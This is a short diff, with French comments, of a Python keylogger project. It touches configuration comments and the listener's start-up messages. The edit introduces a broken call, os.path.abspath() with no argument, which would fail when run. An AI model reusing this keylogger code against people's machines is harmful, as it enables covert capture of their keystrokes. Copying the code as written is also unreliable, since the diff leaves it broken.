@@ -12,6 +12,8 @@ import logger #pour la base de données
 # ── CONFIGURATION ────────────────────────────────────────────
 
 #LOG_FILE = "keylog.txt" #data teste 
+
+#APPELER DATA
 BUFFER_SIZE = 20 #attendre pour pas reouvrire a chaque foi sinon bug
 
 # ── VARIABLES GLOBALES ───────────────────────────────────────
@@ -71,7 +73,7 @@ class KeyLogger:
 
     def start(self):
         print("[*] Démarrage du listener...")
-        print(f"[*] Logs écrits dans : {os.path.abspath(LOG_FILE)}")
+        print(f"[*] Logs écrits dans : {os.path.abspath()}")
         print("[*]ESC pour stop.\n")
         self.is_running = True
 
